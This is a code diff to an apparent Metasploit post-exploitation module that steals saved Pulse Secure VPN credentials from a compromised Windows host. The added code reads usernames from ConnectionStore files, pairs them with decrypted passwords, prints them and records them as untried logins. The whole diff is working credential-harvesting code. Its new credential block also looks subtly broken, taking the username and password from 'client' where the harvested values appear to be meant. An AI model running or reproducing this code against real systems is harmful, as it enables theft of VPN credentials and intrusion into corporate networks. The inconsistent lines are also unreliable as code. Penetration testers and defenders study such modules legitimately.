@@ -110,12 +110,35 @@ class MetasploitModule < Msf::Post
           ives[m[0]]["connection-source"] = m[1]
           ives[m[0]]["friendly-name"] = m[2]
           ives[m[0]]["uri"] = m[3]
+          ives[m[0]]["creds"] = []
         end
       end
       return ives
     rescue Rex::Post::Meterpreter::RequestError => e
       vprint_error(e.message)
     end
+  end
+
+  def get_username(sid, ive_index)
+    if not is_system?
+      return nil
+    end
+    paths = [
+      "C:\\ProgramData\\Pulse Secure\\ConnectionStore\\#{sid}.dat",
+      "C:\\ProgramData\\Pulse Secure\\ConnectionStore\\#{sid}.bak",
+    ]
+    paths.each do |path|
+      if session.fs.file.exist?(path)
+        connstore_data = session.fs.file.open(path).read.to_s
+        matches = connstore_data.scan(/userdata "([a-z0-9]*)" {.*?username: "([^"]*)".*?}/m)
+        matches.each do |m|
+          if m[0] == ive_index
+            return m[1]
+          end
+        end
+      end
+    end
+    return nil
   end
 
   def get_entropy_from_ive_index(ive_index)
@@ -201,9 +224,14 @@ class MetasploitModule < Msf::Post
                 ives[ive_index]["connection-source"] = 'user'
                 ives[ive_index]["friendly-name"] = 'unknown'
                 ives[ive_index]["uri"] = 'unknown'
+                ives[ive_index]["creds"] = []
               end
-              ives[ive_index]['username'] = nil
-              ives[ive_index]['password'] = decrypted.remove("\x00")
+              ives[ive_index]["creds"].append(
+                {
+                  "username" => get_username(profile['SID'], ive_index),
+                  "password" => decrypted.remove("\x00")
+                }
+              )
               creds << ives[ive_index]
             end
           end
@@ -221,50 +249,52 @@ class MetasploitModule < Msf::Post
   end
 
   def gather_creds
-    creds = get_creds
-    if creds.any?
-      creds.each do |cred|
-        print_good("Account Found:")
-        print_status("     Username: #{cred['username']}")
-        print_status("     Password: #{cred['password']}")
-        print_status("     URI: #{cred['uri']}")
-        print_status("     Name: #{cred['friendly-name']}")
-        print_status("     Source: #{cred['connection-source']}")
+    ives = get_creds
+    if ives.any?
+      ives.each do |ive|
+        ive["creds"].each do |creds|
+          print_good("Account found")
+          print_status("     Username: #{creds['username']}")
+          print_status("     Password: #{creds['password']}")
+          print_status("     URI: #{ive['uri']}")
+          print_status("     Name: #{ive['friendly-name']}")
+          print_status("     Source: #{ive['connection-source']}")
 
-        uri = URI(cred['uri'])
-        begin
-          address = Rex::Socket.getaddress(uri.host)
-        rescue SocketError
-          address = nil
+          uri = URI(ive['uri'])
+          begin
+            address = Rex::Socket.getaddress(uri.host)
+          rescue SocketError
+            address = nil
+          end
+          service_data = {
+            address: address,
+            port: uri.port,
+            protocol: "tcp",
+            realm_key: Metasploit::Model::Realm::Key::WILDCARD,
+            realm_value: uri.path,
+            service_name: "Pulse Secure SSL VPN",
+            workspace_id: myworkspace_id
+          }
+
+          credential_data = {
+            origin_type: :session,
+            session_id: session_db_id,
+            post_reference_name: self.refname,
+            username: client['username'],
+            private_data: client['password'],
+            private_type: :password
+          }
+
+          credential_core = create_credential(credential_data.merge(service_data))
+
+          login_data = {
+            core: credential_core,
+            access_level: "User",
+            status: Metasploit::Model::Login::Status::UNTRIED
+          }
+
+          create_credential_login(login_data.merge(service_data))
         end
-        service_data = {
-          address: address,
-          port: uri.port,
-          protocol: "tcp",
-          realm_key: Metasploit::Model::Realm::Key::WILDCARD,
-          realm_value: uri.path,
-          service_name: "Pulse Secure SSL VPN",
-          workspace_id: myworkspace_id
-        }
-
-        credential_data = {
-          origin_type: :session,
-          session_id: session_db_id,
-          post_reference_name: self.refname,
-          username: nil,
-          private_data: cred['password'],
-          private_type: :password
-        }
-
-        credential_core = create_credential(credential_data.merge(service_data))
-
-        login_data = {
-          core: credential_core,
-          access_level: "User",
-          status: Metasploit::Model::Login::Status::UNTRIED
-        }
-
-        create_credential_login(login_data.merge(service_data))
       end
     else
       print_error "No users with configs found. Exiting"
